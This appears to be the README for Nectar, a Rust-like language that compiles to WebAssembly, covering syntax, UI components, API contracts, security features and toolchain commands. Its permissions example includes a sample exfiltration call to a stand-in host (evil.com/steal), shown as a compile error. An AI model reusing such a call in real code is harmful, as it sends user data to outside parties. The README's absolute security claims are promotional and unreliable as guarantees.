# Nectar

**A programming language that compiles to WebAssembly, built for the next era of web development.**

<!-- Badges -->
![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)
![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)
![WASM](https://img.shields.io/badge/target-WebAssembly-654ff0.svg)

Nectar combines Rust's ownership model and type safety with React-like declarative UI primitives, compiling everything to WebAssembly for near-native performance. No garbage collector. No virtual DOM. No runtime overhead. Just fine-grained reactive signals that surgically update exactly the DOM nodes that changed -- in O(1) time.

---

## Why Nectar?

Modern web development forces you to choose: **safety** (Rust, but no UI story), **developer experience** (React, but runtime bloat and GC pauses), or **performance** (hand-written WASM, but painful). Nectar eliminates the trade-off.

| | Rust | React/Svelte | Nectar |
|---|---|---|---|
| Memory safety | Ownership + borrow checker | GC | Ownership + borrow checker |
| Reactivity | Manual | Virtual DOM / compiler magic | Fine-grained signals (O(1)) |
| Output | Native binary | JavaScript bundle | WebAssembly |
| UI primitives | None (3rd party) | Components | Components, stores, routers, agents |
| AI integration | None | Library | First-class (`agent`, `tool`, `prompt`) |
| API safety | Manual | Types erased at runtime | Contracts — compile-time + runtime + wire-level |
| Security | Manual / opt-in | `dangerouslySetInnerHTML` exists | XSS impossible, `secret` types, capability permissions |
| Mobile/PWA | Library (Workbox, etc.) | Library | First-class (`app`, `offline`, `gesture`, `haptic`) |
| SEO/AAIO | N/A | Requires Next.js + manual setup | Built-in (`page`, `meta`, auto sitemap/JSON-LD) |
| Supply chain | npm (1000s of deps) | npm (1000s of deps) | Zero JS dependencies — flat WASM binary |
| Bundle size | N/A | 40-150 KB runtime | ~0 KB runtime overhead |

Nectar was designed from the ground up with these principles:

- **No GC, ever.** Ownership and borrowing at the language level means predictable, zero-pause memory management.
- **O(1) reactive updates.** Signals track dependencies at compile time. When state changes, only the exact DOM nodes that depend on it are updated -- no diffing, no reconciliation.
- **AI-native.** The `agent` keyword, `tool` definitions, and `prompt` templates are part of the grammar, not a library. Build AI-powered interfaces with the same safety guarantees as the rest of your code.
- **API boundary safety.** The `contract` keyword defines the shape of external data. The compiler checks field access, the runtime validates responses in WASM, and a content hash on the wire catches backend drift. The entire class of FE/BE data mismatch bugs is eliminated.
- **Security by elimination.** XSS is structurally impossible -- the rendering pipeline has no `innerHTML`. Prototype pollution cannot happen -- WASM linear memory has no prototype chain. The `secret` keyword prevents sensitive data from being logged or rendered. `permissions` blocks restrict component capabilities at compile time. There are zero JavaScript dependencies -- no `node_modules`, no supply chain risk.
- **Mobile-native PWA.** The `app` keyword generates PWA manifests, service workers, and offline strategies. `gesture` blocks handle swipes, long-press, and pinch. `haptic` provides vibration feedback. Nectar apps install to the home screen, work offline, and feel native -- not like a web page in a browser frame.
- **One toolchain.** Compiler, formatter, linter, test runner, dev server, package manager, and LSP -- all in one binary.

---

## Quick Start

### Install from source

```bash
git clone https://github.com/BlakeBurnette/nectar-lang.git
cd nectar-lang
cargo build --release
```

The compiler binary is at `./target/release/nectar`.

### Hello World

Create `hello.nectar`:

```nectar
component Hello(name: String) {
    render {
        <div>
            <h1>"Hello from Nectar!"</h1>
            <p>{name}</p>
        </div>
    }
}
```

### Compile and run

```bash
# Compile to WebAssembly text format (.wat)
./target/release/nectar build hello.nectar

# Compile to binary WebAssembly (.wasm)
./target/release/nectar build hello.nectar --emit-wasm

# Start the dev server with hot reload
./target/release/nectar dev --src . --port 3000
```

---

## Language Tour

### Variables & Types

Nectar has a Rust-like type system with ownership semantics. Variables are immutable by default.

```nectar
// Immutable binding
let name: String = "Nectar";
let age: u32 = 1;
let pi: f64 = 3.14159;
let active: bool = true;

// Mutable binding
let mut count: i32 = 0;
count = count + 1;

// Type inference
let message = "hello";  // inferred as String

// Reactive signal — automatically tracks dependencies
signal counter: i32 = 0;

// Ownership: values are moved by default
let a: String = "hello";
let b = a;          // `a` is moved into `b`; using `a` after this is a compile error

// Borrowing
let r: &String = &b;         // immutable borrow
let mr: &mut String = &mut b; // mutable borrow
```

**Primitive types:** `i32`, `i64`, `u32`, `u64`, `f32`, `f64`, `bool`, `String`

**Compound types:** `[T]` (arrays), `(T, U)` (tuples), `Option<T>`, `Result<T, E>`

### Functions

```nectar
fn add(a: i32, b: i32) -> i32 {
    a + b
}

fn greet(name: &String) -> String {
    format("Hello, {}!", name)
}

// Public function
pub fn factorial(n: u32) -> u32 {
    if n <= 1 { 1 } else { n * factorial(n - 1) }
}

// Functions with lifetime annotations
fn longest<'a>(a: &'a String, b: &'a String) -> &'a String {
    if a.len() > b.len() { a } else { b }
}
```

### Components

Components are first-class UI primitives with props, state, methods, scoped styles, and a render block.

```nectar
component Counter(initial: i32) {
    let mut count: i32 = initial;

    fn increment(&mut self) {
        self.count = self.count + 1;
    }

    fn decrement(&mut self) {
        self.count = self.count - 1;
    }

    style {
        .counter {
            font-size: "24px";
            padding: "16px";
        }
        .counter button {
            margin: "0 4px";
        }
    }

    render {
        <div class="counter">
            <h2>"Counter"</h2>
            <span>{self.count}</span>
            <button on:click={self.increment}>"+1"</button>
            <button on:click={self.decrement}>"-1"</button>
        </div>
    }
}
```

Components support:
- **Props** -- immutable inputs declared in the parameter list
- **State** -- `let mut` or `signal` fields that trigger re-renders
- **Methods** -- functions that operate on component state via `&self` or `&mut self`
- **Scoped styles** -- CSS that is automatically scoped to the component
- **Event handlers** -- `on:click`, `on:input`, `on:submit`, etc.
- **Generic type parameters** and **trait bounds**
- **Error boundaries** -- catch render errors with a fallback UI

### Stores

Stores are global reactive state containers, inspired by Flux/Redux but with fine-grained signal reactivity.

```nectar
struct User {
    id: u32,
    name: String,
    email: String,
}

enum AuthStatus {
    LoggedOut,
    Loading,
    LoggedIn(User),
    Error(String),
}

store AuthStore {
    // Signals — reactive state fields
    signal status: AuthStatus = AuthStatus::LoggedOut;
    signal token: String = "";

    // Synchronous action
    action logout(&mut self) {
        self.status = AuthStatus::LoggedOut;
        self.token = "";
    }

    // Async action — fetches from an API
    async action login(&mut self, email: String, password: String) {
        self.status = AuthStatus::Loading;
        let response = await fetch("https://api.example.com/auth/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: format("{\"email\": \"{}\", \"password\": \"{}\"}", email, password),
        });
        if response.status == 200 {
            let user = response.json();
            self.token = response.headers.get("Authorization");
            self.status = AuthStatus::LoggedIn(user);
        } else {
            self.status = AuthStatus::Error("Login failed");
        }
    }

    // Computed — derived from signals, cached and auto-updated
    computed is_logged_in(&self) -> bool {
        match self.status {
            AuthStatus::LoggedIn(_) => true,
            _ => false,
        }
    }

    // Effect — side effect that runs whenever dependencies change
    effect on_auth_change(&self) {
        match self.status {
            AuthStatus::LoggedIn(user) => {
                println(format("User logged in: {}", user.name));
            }
            _ => {}
        }
    }
}

// Using a store from any component
component Dashboard() {
    render {
        <div>
            <p>{format("Logged in: {}", AuthStore::is_logged_in())}</p>
            <button on:click={AuthStore::logout}>"Sign Out"</button>
        </div>
    }
}
```

### Structs & Enums

```nectar
struct Todo {
    id: u32,
    text: String,
    done: bool,
}

enum Filter {
    All,
    Active,
    Completed,
}

// Enums with data
enum AuthStatus {
    LoggedOut,
    Loading,
    LoggedIn(User),
    Error(String),
}

// Struct instantiation
let todo = Todo {
    id: 0,
    text: "Learn Nectar",
    done: false,
};
```

### Traits

```nectar
trait Display {
    fn to_string(&self) -> String;
}

trait Drawable {
    fn draw(&self);
    // Default implementation
    fn debug_draw(&self) {
        println("Drawing...");
        self.draw();
    }
}

// Implementing a trait
impl Display for Todo {
    fn to_string(&self) -> String {
        format("[{}] {}", if self.done { "x" } else { " " }, self.text)
    }
}
```

### Generics

```nectar
fn first<T>(items: [T]) -> &T {
    &items[0]
}

// With trait bounds
fn print_all<T: Display>(items: [T]) {
    for item in &items {
        println(item.to_string());
    }
}

// Generic structs
struct Pair<A, B> {
    first: A,
    second: B,
}

// Where clauses
fn compare<T>(a: &T, b: &T) -> bool where T: Eq {
    a == b
}
```

### Pattern Matching & Destructuring

Nectar supports exhaustive pattern matching with the `match` expression. The compiler checks that all variants are covered.

```nectar
// Match on enums
match status {
    AuthStatus::LoggedOut => println("Not logged in"),
    AuthStatus::Loading => println("Please wait..."),
    AuthStatus::LoggedIn(user) => println(format("Hello, {}", user.name)),
    AuthStatus::Error(msg) => println(format("Error: {}", msg)),
}

// Destructuring let
let (x, y) = (10, 20);
let Todo { text, done, .. } = todo;
let [first, second, ..] = items;

// Pattern matching in match arms
match point {
    (0, 0) => "origin",
    (x, 0) => format("x-axis at {}", x),
    (0, y) => format("y-axis at {}", y),
    (x, y) => format("({}, {})", x, y),
}

// Wildcard
match filter {
    Filter::All => &self.todos,
    _ => self.todos.iter().filter(fn(t: &Todo) -> bool { !t.done }),
}
```

### Closures & Iterators

```nectar
// Closure syntax
let double = fn(x: i32) -> i32 { x * 2 };

// Iterator chains
let active_names = todos.iter()
    .filter(fn(t: &Todo) -> bool { !t.done })
    .map(fn(t: &Todo) -> String { t.text })
    .collect();

// For loops over iterators
for todo in &mut self.todos {
    if todo.id == id {
        todo.done = !todo.done;
    }
}
```

### Error Handling

```nectar
// Option type
let user: Option<User> = None;

match user {
    Some(u) => println(u.name),
    None => println("No user"),
}

// Result type
struct ApiError {
    status: u32,
    message: String,
}

// The ? operator propagates errors
fn fetch_user(id: u32) -> Result<User, ApiError> {
    let response = await fetch(format("https://api.example.com/users/{}", id));
    let user = response.json()?;
    return Ok(user);
}

// Try/catch blocks
try {
    let data = fetch_user(42)?;
    println(data.name);
} catch err {
    println(format("Failed: {}", err.message));
}
```

### Contracts — API Boundary Safety

Contracts are Nectar's solution to the most common class of frontend bugs: **data shape mismatches between frontend and backend**. They enforce the shape of external data (API responses, WebSocket messages, etc.) at three levels:

1. **Compile-time** — If you access a field that doesn't exist on the contract, the compiler catches it. Not the user's browser three weeks later.
2. **Runtime boundary validation** — Every API response is validated in WASM before it enters your app. Malformed data never propagates. External data is **untrusted by default**, like Rust's `unsafe` boundary.
3. **Wire-level staleness detection** — A content hash is embedded in every request. If the backend was built against a different contract version, the mismatch is caught on the first request.

```nectar
// Define the shape of an API response
contract CustomerResponse {
    id: u32,
    name: String,
    email: String,
    balance_cents: i64,
    tier: enum { free, pro, enterprise },
    created_at: String,
    deleted_at: String?,   // nullable field
}

// fetch -> ContractName validates the response at the boundary
let customer = await fetch("/api/customers/42") -> CustomerResponse;

// Compile-time checked field access:
let name = customer.name;       // OK
let tier = customer.tier;       // OK
let x = customer.display_name;  // COMPILE ERROR: contract CustomerResponse
                                // has no field display_name
```

Every request with a contract binding automatically includes a hash header:

```
GET /api/customers/42
X-Nectar-Contract: CustomerResponse@a3f8b2c1
```

The backend middleware checks this hash against the contract it was built with. If they don't match, you get an immediate, actionable error — not `undefined is not a function` three clicks deep.

#### Contract Export

The compiler can export contracts as JSON Schema, OpenAPI, or Protobuf definitions for backend teams:

```bash
nectar export-contracts --format jsonschema  > schemas/
nectar export-contracts --format openapi     > api-spec.yaml
nectar export-contracts --format protobuf    > contracts.proto
```

The frontend is the source of truth for the API shape it consumes. The backend validates against the same contract in CI. If their response shape drifts, **their build fails** — not the users' browsers.

| Approach | Compile-time | Runtime | Backend-agnostic | Zero-cost when valid |
|---|---|---|---|---|
| TypeScript types | Yes | **No** (erased) | Yes | N/A |
| Zod/io-ts | No | Yes | Yes | No (JS overhead) |
| tRPC | Yes | Yes | **No** (TS only) | No |
| GraphQL | Partial | Partial | Yes | No |
| **Nectar contracts** | **Yes** | **Yes** | **Yes** | **Yes** (WASM) |

### Security

Nectar makes entire vulnerability classes **structurally impossible** at the language level -- not through best practices or linting, but by eliminating the mechanisms that enable them.

#### XSS Is Impossible

The WASM-to-DOM bridge only exposes `setText()` (which sets `textContent`) and `setAttribute()`. There is no `innerHTML`, no `dangerouslySetInnerHTML`, no `eval()`, no `document.write()`. The language **does not have a mechanism** to inject raw HTML. This is not a lint rule you can disable -- the capability does not exist.

#### Prototype Pollution Is Impossible

WASM linear memory is a flat byte array. There is no `__proto__`, no `constructor.prototype`, no `Object.assign` spreading attacker-controlled keys into your object tree. An entire class of supply chain attacks evaporates because the attack surface does not exist.

#### Zero Supply Chain Risk

Nectar compiles to a flat WASM binary. There is no `node_modules` directory with 1,400 transitive dependencies, no `postinstall` scripts running arbitrary code, no lodash version conflict. The attack surface is the Nectar runtime (which you audit once) and your own code.

#### Secret Types

The `secret` modifier prevents sensitive values from being logged, serialized to JSON, rendered to the DOM, or leaked through error messages. The compiler enforces this -- not a code review.

```nectar
let secret api_key: String = env("STRIPE_KEY");
let secret password: String = form.password;

// COMPILE ERROR: cannot pass secret value to non-secret context
console.log(api_key);          // error: cannot log secret value
setText(el, password);         // error: cannot render secret to DOM
json.serialize(api_key);       // error: cannot serialize secret

// OK: secret flows to secret-accepting functions
stripe.charge(api_key, amount);
hash(password);
```

#### Capability-Based Permissions

Components declare what they can access. The compiler enforces it. A component that does not declare network access cannot call `fetch`.

```nectar
component PaymentForm() {
    permissions {
        network: ["https://api.stripe.com/*"],
        storage: ["session:auth_token"],
    }

    // OK: URL matches declared network permission
    let charge = await fetch("https://api.stripe.com/v1/charges") -> ChargeResponse;

    // COMPILE ERROR: URL not in declared permissions
    let leak = await fetch("https://evil.com/steal");
    //                      ^^^^^^^^^^^^^^^^^^^^^^^^
    //  error: fetch URL does not match any declared network permission

    render {
        <form on:submit={self.handle_pay}>
            <input type="text" bind:value={card_number} />
            <button>"Pay Now"</button>
        </form>
    }
}
```

#### Automatic CSP Generation

The compiler analyzes every `fetch()` URL, image source, and font reference in your code and emits a tight Content-Security-Policy header:

```bash
nectar build app.nectar --emit-csp
# default-src 'self'; connect-src https://api.payhive.com https://api.stripe.com; ...
```

No manual CSP authoring. No accidentally leaving `unsafe-inline`. The policy is derived from the code.

### Progressive Web App (PWA)

Nectar apps are mobile-native by default. The `app` keyword replaces the need for separate PWA tooling, service worker libraries, and manifest generators.

#### App Declaration

```nectar
app PayHive {
    manifest {
        name: "PayHive",
        short_name: "PayHive",
        theme_color: "#303234",
        background_color: "#303234",
        display: "standalone",
        orientation: "portrait",
    }

    offline {
        precache: ["/", "/app", "/app/schedule", "/app/customers"],
        strategy: "stale-while-revalidate",
        fallback: OfflinePage,
    }

    push {
        vapid_key: env("VAPID_PUBLIC_KEY"),
        on_message: handle_push,
    }

    router AppRouter {
        route "/" => Home,
        route "/app" => Dashboard,
        route "/app/schedule" => Schedule,
    }
}
```

The compiler generates:
- `manifest.webmanifest` for Add to Home Screen / app install
- A service worker with precaching and runtime caching
- App shell HTML that loads instantly from cache
- Splash screen matching the manifest theme

The result is a **standalone app** with no browser chrome -- it looks and feels like a native mobile app.

#### Gestures

First-class gesture recognition eliminates the need for gesture libraries like Hammer.js:

```nectar
component ScheduleView() {
    gesture swipe_left {
        navigate("/app/schedule/next-week");
    }

    gesture swipe_down {
        self.refresh();
    }

    gesture long_press on:customer_card {
        self.show_context_menu();
        haptic("medium");
    }

    render {
        <div class="schedule">
            // ...
        </div>
    }
}
```

#### Hardware Access

Native device APIs are first-class language constructs:

```nectar
// Biometric authentication (WebAuthn)
let credential = await biometric.authenticate({
    challenge: server_challenge,
    rp: "payhive.com",
});

// Camera for document scanning
let photo = await camera.capture({ facing: "rear" });

// GPS for field service
let location = await geolocation.current();

// Haptic feedback
haptic("success");
```

#### Distribution

```bash
nectar build app.nectar --target pwa          # PWA — installable from browser
nectar build app.nectar --target twa          # Android Trusted Web Activity (Play Store)
nectar build app.nectar --target capacitor    # iOS/Android native wrapper (App Store)
```

### SEO & AAIO (AI Answer Optimization)

Single Page Applications are invisible to search engines and AI systems by default. Nectar makes SEO a **compile-time guarantee**.

#### The SPA Problem

Traditional SPAs serve an empty HTML shell. Crawlers -- both search engines and AI systems (ChatGPT Browse, Perplexity, Google SGE) -- see nothing:

```html
<!-- What a React SPA serves to crawlers -->
<html><body><div id="root"></div><script src="bundle.js"></script></body></html>
```

Next.js and Nuxt bolt on SSR/SSG as afterthoughts, requiring a Node.js server, complex configuration, and hydration mismatch bugs.

#### The `page` Keyword

Nectar's `page` keyword declares a component that the compiler **pre-renders to static HTML at build time**:

```nectar
page BlogPost(slug: String) {
    meta {
        title: f"Blog | {self.title}",
        description: self.excerpt,
        canonical: f"/blog/{slug}",
        structured_data: Schema.Article {
            headline: self.title,
            author: self.author,
            date_published: self.date,
        },
    }

    render {
        <article>
            <h1>{self.title}</h1>
            <p>{self.excerpt}</p>
        </article>
    }
}
```

#### What the Compiler Generates

From a `page` definition and a `router`, the Nectar compiler automatically produces:

| Artifact | Source | Manual in React? |
|---|---|---|
| Pre-rendered HTML | `page` + `render` block | Requires Next.js + config |
| `<title>` and meta tags | `meta` block | Manual `<Head>` per page |
| Open Graph tags | `meta { og_image }` | Manual per page |
| JSON-LD structured data | `meta { structured_data }` | Manual JSON strings |
| `sitemap.xml` | `router` routes | Requires `next-sitemap` plugin |
| `robots.txt` | Auto-generated | Manual file |
| Canonical URLs | `meta { canonical }` | Manual per page |

#### Semantic HTML Enforcement

The compiler warns when you use non-semantic HTML where semantic elements are appropriate:

```
warning[semantic_html]: <div> used as page wrapper — consider <main>, <article>, or <section>
  --> src/pages/blog.nectar:12:9
   |
12 |         <div class="post">
   |         ^^^^ non-semantic element
   |
   = help: semantic HTML improves SEO ranking and AI content extraction
```

#### Build Targets

```bash
nectar build site.nectar --target ssg       # Static — pre-render all routes at build time
nectar build site.nectar --target ssr       # Server — WASM renders on edge/server per request
nectar build site.nectar --target hybrid    # Static for known routes, SSR for dynamic
```

#### AAIO: AI Answer Optimization

AI systems (ChatGPT, Perplexity, Claude, Google SGE) extract answers from web content. Nectar optimizes for this automatically:

- **Structured data**: JSON-LD generated from `Schema.*` declarations tells AI systems exactly what your content represents
- **Semantic HTML**: `<article>`, `<main>`, `<section>` help AI systems understand content hierarchy
- **Clean DOM**: No framework wrapper divs -- WASM renders minimal, semantic markup
- **Pre-rendered content**: AI crawlers see full content without executing JavaScript

### String Interpolation

```nectar
// Using format()
let greeting = format("Hello, {}!", name);

// Format strings with f"..."
let message = f"Count: {self.count}";
let summary = f"{user.name} has {posts.len()} posts";

// In templates
render {
    <p>{f"Welcome back, {user.name}!"}</p>
    <span>{format("Total: {} items", items.len())}</span>
}
```

### Async/Await & Fetch

`fetch` is a first-class language construct, not a library import.

```nectar
// GET request
let response = await fetch("https://jsonplaceholder.typicode.com/posts");
let posts: [Post] = response.json();

// POST request with options
let response = await fetch("https://api.example.com/posts", {
    method: "POST",
    headers: {
        "Content-Type": "application/json",
    },
    body: format("{\"title\": \"{}\", \"body\": \"{}\"}", title, body),
});

// DELETE request
let response = await fetch(url, { method: "DELETE" });

// Async store actions
async action fetch_posts(&mut self) {
    self.loading = true;
    let response = await fetch("https://api.example.com/posts");
    if response.status == 200 {
        self.posts = response.json();
    }
    self.loading = false;
}
```

### Concurrency

```nectar
// Spawn a task on a Web Worker
spawn {
    let result = heavy_computation();
    println(result);
};

// Channels for inter-task communication
let ch = channel::<String>();
spawn {
    ch.send("hello from worker");
};
let message = ch.receive();

// Parallel execution — run multiple tasks and collect results
let results = parallel {
    fetch("https://api.example.com/users"),
    fetch("https://api.example.com/posts"),
    fetch("https://api.example.com/comments"),
};
```

### AI Agents

The `agent` keyword defines a component that wraps LLM interaction with tool calling and streaming.

```nectar
agent ChatBot {
    prompt system = "You are a helpful coding assistant.";

    signal messages: [Message] = [];
    signal input: String = "";
    signal streaming: bool = false;

    // Tools — functions the AI can call
    tool search_docs(query: String) -> String {
        let results = await fetch(format("https://api.example.com/search?q={}", query));
        return results.json().summary;
    }

    tool run_code(language: String, code: String) -> String {
        let result = await fetch("https://api.example.com/execute", {
            method: "POST",
            body: { language: language, code: code },
        });
        return result.json().output;
    }

    fn send(&mut self) {
        let msg = Message { role: "user", content: self.input };
        self.messages.push(msg);
        self.input = "";
        self.streaming = true;
        // Stream response — each token updates the UI reactively
        ai::chat_stream(self.messages, self.tools);
    }

    render {
        <div class="chat">
            <div class="messages">
                {for msg in self.messages {
                    <div class={msg.role}>
                        <div class="content">{msg.content}</div>
                    </div>
                }}
                {if self.streaming {
                    <div class="typing">"..."</div>
                }}
            </div>
            <input value={self.input} on:submit={self.send} />
        </div>
    }
}
```

### Routing & Navigation

```nectar
// Define routes
router AppRouter {
    route "/" => Home,
    route "/about" => About,
    route "/user/:id" => UserProfile,      // parameterized route
    route "/admin/*" => AdminPanel guard { AuthStore::is_logged_in() },  // guarded route
    fallback => NotFound,
}

// Link component for navigation
render {
    <nav>
        <Link to="/">"Home"</Link>
        <Link to="/about">"About"</Link>
        <Link to="/user/42">"Profile"</Link>
    </nav>
}

// Programmatic navigation
fn go_home(&self) {
    navigate("/");
}
```

### Animations & Transitions

```nectar
component AnimatedCard() {
    // CSS transitions on state changes
    transition opacity 300ms ease-in-out;
    transition transform 200ms ease;

    // Trigger animations imperatively
    fn on_enter(&self) {
        animate(self.card_ref, "fadeIn");
    }

    style {
        .card {
            opacity: "1";
            transform: "translateY(0)";
        }
    }

    render {
        <div class="card">
            <p>"Animated content"</p>
        </div>
    }
}
```

### Accessibility

Nectar has first-class support for ARIA attributes, roles, and focus management.

```nectar
component Modal(title: String) {
    render {
        <div role="dialog" aria-label={self.title}>
            <h2>{self.title}</h2>
            <div role="document">
                <p>"Modal content"</p>
            </div>
            <button aria-label="Close" on:click={self.close}>"X"</button>
        </div>
    }
}
```

The runtime provides built-in helpers: `setAriaAttribute`, `setRole`, `manageFocus`, `announceToScreenReader`, `trapFocus`, and `releaseFocusTrap`.

### Form Binding

Two-way data binding with the `bind:` directive keeps signals and form inputs in sync automatically.

```nectar
component LoginForm() {
    let mut email: String = "";
    let mut password: String = "";

    render {
        <form>
            <input type="email" bind:value={email} placeholder="Email" />
            <input type="password" bind:value={password} placeholder="Password" />
            <button on:click={self.handle_submit}>"Sign In"</button>
        </form>
    }
}
```

`bind:value`, `bind:checked`, and other bindings set the initial property from the signal, create an effect to keep the DOM in sync, and add input/change listeners to push user edits back.

### Modules & Imports

```nectar
// Import from standard library
use std::string;

// Import specific items
use std::collections::{HashMap, Vec};

// Import with alias
use crate::components::UserCard as Card;

// Glob import
use crate::utils::*;

// Module declarations
mod auth;           // loads auth.nectar from the same directory
mod components {    // inline module
    pub component Button(label: String) {
        render {
            <button>{self.label}</button>
        }
    }
}
```

### Testing

```nectar
test "addition works" {
    assert_eq(2 + 2, 4);
}

test "todo creation" {
    let todo = Todo { id: 0, text: "Test", done: false };
    assert(!todo.done);
    assert_eq(todo.text, "Test");
}

test "store increment" {
    CounterStore::increment();
    assert_eq(CounterStore::get_count(), 1);
}

test "async fetch" {
    let response = await fetch("https://httpbin.org/get");
    assert_eq(response.status, 200, "Expected 200 OK");
}
```

Run tests with:

```bash
nectar test my_tests.nectar
nectar test my_tests.nectar --filter "todo"
```

---

## Toolchain

All tools are subcommands of the single `nectar` binary.

### `nectar build`

Compile `.nectar` source files to WebAssembly.

```bash
nectar build app.nectar                    # Output app.wat (text format)
nectar build app.nectar --emit-wasm        # Output app.wasm (binary)
nectar build app.nectar -o out.wasm --emit-wasm
nectar build app.nectar --ssr              # Output app.ssr.js (server-side rendering)
nectar build app.nectar --hydrate          # Output app.hydrate.wat (hydration bundle)
nectar build app.nectar -O1                # Basic optimization (const fold + DCE)
nectar build app.nectar -O2                # Full optimization (+ tree shaking + WASM opts)
nectar build app.nectar --emit-tokens      # Debug: print token stream
nectar build app.nectar --emit-ast         # Debug: print AST
nectar build app.nectar --no-check         # Skip borrow checker and type checker
```

| Flag | Description |
|---|---|
| `--output`, `-o` | Output file path (default: `<input>.wat` or `.wasm`) |
| `--emit-wasm` | Emit binary `.wasm` instead of `.wat` text |
| `--emit-tokens` | Print the token stream and exit (debugging) |
| `--emit-ast` | Print the parsed AST and exit (debugging) |
| `--ssr` | Emit a server-side rendering JavaScript module |
| `--hydrate` | Emit a client hydration bundle |
| `--no-check` | Skip borrow checking and type checking |
| `-O`, `--optimize` | Optimization level: `0` (none), `1` (const fold + DCE), `2` (all passes) |

### `nectar test`

Compile and run `test` blocks.

```bash
nectar test tests.nectar
nectar test tests.nectar --filter "auth"
```

| Flag | Description |
|---|---|
| `--filter` | Run only tests whose name contains the given pattern |

### `nectar fmt`

Format Nectar source files.

```bash
nectar fmt app.nectar                 # Format in place
nectar fmt app.nectar --check         # Check formatting (exit 1 if changes needed)
nectar fmt --stdin                 # Read from stdin, write to stdout
```

| Flag | Description |
|---|---|
| `--check` | Check without writing; exits with code 1 if reformatting is needed |
| `--stdin` | Read source from stdin instead of a file |

### `nectar lint`

Run static analysis on Nectar source files.

```bash
nectar lint app.nectar
nectar lint app.nectar --fix          # Auto-fix warnings where possible
```

| Flag | Description |
|---|---|
| `--fix` | Attempt to auto-fix lint warnings |

### `nectar dev`

Start a development server with hot reload. The server watches for file changes, recompiles, and pushes updates to the browser via WebSocket -- preserving signal state across reloads.

```bash
nectar dev                            # Defaults: src=., port=3000, build-dir=./build
nectar dev --src ./src --port 8080
nectar dev --build-dir ./dist
```

| Flag | Description |
|---|---|
| `--src` | Source directory to watch (default: `.`) |
| `--port`, `-p` | Port to serve on (default: `3000`) |
| `--build-dir` | Build output directory (default: `./build`) |

### `nectar init` / `nectar add` / `nectar install`

Package management commands.

```bash
nectar init                           # Create Nectar.toml in current directory
nectar init --name my-project         # Create with a specific project name

nectar add router                     # Add a dependency (latest version)
nectar add router --version "^1.0"    # Add with version constraint
nectar add utils --path ../utils      # Add a local path dependency
nectar add ui --features "dark,icons" # Add with features

nectar install                        # Resolve and download all dependencies
```

### `nectar build --target`

Build for different deployment targets.

```bash
nectar build app.nectar --target pwa          # PWA with manifest + service worker
nectar build app.nectar --target twa          # Android Trusted Web Activity wrapper
nectar build app.nectar --target capacitor    # iOS/Android native wrapper
nectar build app.nectar --target ssg          # Static site generation — pre-render all routes
nectar build app.nectar --target ssr          # Server-side rendering — WASM on edge/server
nectar build app.nectar --target hybrid       # SSG for known routes, SSR for dynamic routes
nectar build app.nectar --emit-csp            # Emit Content-Security-Policy header
```

| Flag | Description |
|---|---|
| `--target pwa` | Generate `manifest.webmanifest`, service worker, app shell HTML |
| `--target twa` | Generate Android TWA wrapper for Google Play Store distribution |
| `--target capacitor` | Generate Capacitor project for iOS App Store / Google Play |
| `--target ssg` | Static site generation -- pre-render all `page` routes to HTML at build time |
| `--target ssr` | Server-side rendering -- WASM renders pages on edge/server per request |
| `--target hybrid` | SSG for known routes, SSR for dynamic routes (combines both strategies) |
| `--emit-csp` | Analyze all resource URLs and emit a tight Content-Security-Policy |

### `nectar export-contracts`

Export contract definitions as JSON Schema, OpenAPI, or Protobuf for backend teams.

```bash
nectar export-contracts app.nectar --format jsonschema   # JSON Schema files
nectar export-contracts app.nectar --format openapi      # OpenAPI components/schemas
nectar export-contracts app.nectar --format protobuf     # Protocol Buffers .proto
```

| Flag | Description |
|---|---|
| `--format` | Output format: `jsonschema` (default), `openapi`, `protobuf` |
| `--output`, `-o` | Output directory (default: stdout) |

### `--lsp`

Start the Language Server Protocol server for editor integration (completion, diagnostics, go-to-definition).

```bash
nectar --lsp
```

---

## Architecture

### Compiler Pipeline

```
                                ┌──────────────┐
                                │  Source Code  │
                                │   (.nectar)      │
                                └──────┬───────┘
                                       │
                                       v
                              ┌────────────────┐
                              │     Lexer      │
                              │  token.rs      │
                              └───────┬────────┘
                                      │ tokens
                                      v
                              ┌────────────────┐
                              │     Parser     │  ← error recovery
                              │  parser.rs     │
                              └───────┬────────┘
                                      │ AST
                            ┌─────────┼──────────┐
                            v         v          v
                     ┌────────┐ ┌──────────┐ ┌────────────────┐
                     │ Borrow │ │  Type    │ │ Exhaustiveness │
                     │ Check  │ │  Check   │ │    Check       │
                     └────┬───┘ └────┬─────┘ └───────┬────────┘
                          │          │               │
                          └──────────┼───────────────┘
                                     v
                           ┌───────────────────┐
                           │    Optimizer       │
                           │  const_fold.rs     │
                           │  dce.rs            │
                           │  tree_shake.rs     │
                           └────────┬──────────┘
                                    │ optimized AST
                          ┌─────────┼──────────┐
                          v         v          v
                   ┌──────────┐ ┌────────┐ ┌────────┐
                   │  Codegen │ │  SSR   │ │  WASM  │
                   │  (.wat)  │ │ (.js)  │ │ binary │
                   └──────────┘ └────────┘ └────────┘
```

### Module Reference

| Module | File | Description |
|---|---|---|
| **Lexer** | `lexer.rs` | Tokenizes Nectar source into a stream of typed tokens |
| **Tokens** | `token.rs` | Token type definitions and span tracking |
| **AST** | `ast.rs` | Abstract syntax tree node definitions for the full grammar |
| **Parser** | `parser.rs` | Recursive descent parser with error recovery |
| **Borrow Checker** | `borrow_checker.rs` | Validates ownership, move semantics, and borrow lifetimes |
| **Type Checker** | `type_checker.rs` | Hindley-Milner type inference with trait bounds |
| **Exhaustiveness** | `exhaustiveness.rs` | Checks that `match` expressions cover all variants |
| **Codegen** | `codegen.rs` | Generates WebAssembly text format (`.wat`) |
| **WASM Binary** | `wasm_binary.rs` | Emits binary `.wasm` from the AST |
| **SSR Codegen** | `ssr.rs` | Generates server-side rendering JavaScript modules |
| **Optimizer** | `optimizer.rs` | Orchestrates optimization passes by level |
| **Const Fold** | `const_fold.rs` | Evaluates constant expressions at compile time |
| **DCE** | `dce.rs` | Dead code elimination |
| **Tree Shake** | `tree_shake.rs` | Removes unused functions, structs, and components |
| **WASM Opt** | `wasm_opt.rs` | Peephole optimizations on generated WAT |
| **Sourcemap** | `sourcemap.rs` | Source map generation for debugging |
| **Formatter** | `formatter.rs` | Code formatter for `nectar fmt` |
| **Linter** | `linter.rs` | Static analysis rules for `nectar lint` |
| **LSP** | `lsp.rs` | Language Server Protocol implementation |
| **Dev Server** | `devserver.rs` | Development server with file watching and hot reload |
| **Module Resolver** | `module_resolver.rs` | Resolves `mod` and `use` paths to files |
